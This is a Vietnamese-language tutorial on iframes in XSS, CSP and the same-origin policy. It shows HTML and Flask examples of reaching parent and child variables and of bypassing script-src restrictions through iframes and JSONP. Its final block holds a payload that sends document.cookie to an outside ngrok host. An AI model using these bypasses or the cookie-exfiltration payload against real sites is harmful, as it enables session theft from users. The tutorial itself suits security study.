# **Iframes in XSS, CSP and SOP**

## **Iframes in XSS**

- Có 3 cách để chỉ ra nội dung của trang có khung:
    - Thông qua `src` chỉ ra một URL (URL có thể có nguồn gốc chéo hoặc cùng nguồn gốc)
    - Thông qua `src` chỉ ra nội dung sử dụng giao thức data:
    - Qua `srcdoc` chỉ ra nội dung


> **Accesing Parent & Child vars (Truy cập vars Parent & Child)**

```html
<html>
  <script>
  var secret = "31337s3cr37t";
  </script>

  <iframe id="if1" src="http://127.0.1.1:8000/child.html"></iframe>
  <iframe id="if2" src="child.html"></iframe>
  <iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
  <iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>

  <script>
  function access_children_vars(){
    alert(if1.secret);
    alert(if2.secret);
    alert(if3.secret);
    alert(if4.secret);
  }
  setTimeout(access_children_vars, 3000);
  </script>
</html>
```

## **Iframes with CSP**

- Giá trị self của script-src sẽ không cho phép thực thi mã JS bằng cách sử dụng giao thức data: hoặc thuộc tính srcdoc.
Tuy nhiên, ngay cả giá trị không có của CSP cũng sẽ cho phép thực thi các iframe đặt URL (hoàn chỉnh hoặc chỉ đường dẫn) trong thuộc tính src.
Do đó, có thể bỏ qua CSP của một trang bằng:

```html
<html>
<head>
 <meta http-equiv="Content-Security-Policy" content="script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk='">
</head>
  <script>
  var secret = "31337s3cr37t";
  </script>
  <iframe id="if1" src="child.html"></iframe>
  <iframe id="if2" src="http://127.0.1.1:8000/child.html"></iframe>
  <iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
  <iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>
</html>

//Lưu ý rằng CSP trước đó chỉ cho phép thực thi tập lệnh nội tuyến.
Tuy nhiên, chỉ các tập lệnh if1 và if2 mới được thực thi nhưng chỉ if1 mới có thể truy cập vào bí mật gốc.
```

- Do đó, có thể bỏ qua CSP nếu bạn có thể tải tệp JS lên máy chủ và tải tệp đó qua iframe ngay cả với script-src 'none'. Điều này có thể cũng có thể được thực hiện bằng cách lạm dụng điểm cuối JSONP trên cùng một trang.
Bạn có thể kiểm tra điều này với tình huống sau đây là cookie bị đánh cắp ngay cả khi có script-src 'none'. Chỉ cần chạy ứng dụng và truy cập nó bằng trình duyệt của bạn

```python
import flask
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
    resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
    resp.headers['Content-Security-Policy'] = "script-src 'self'"
    resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
    return resp

@app.route("/cookie_s.html")
def cookie_s():
    return "<script>alert(document.cookie)</script>"

if __name__ == "__main__":
    app.run()
```

```html
<!-- This one requires the data: scheme to be allowed -->
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
<!-- This one injects JS in a jsonp endppoint -->
<iframe srcdoc='<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
<!-- sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)-->
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```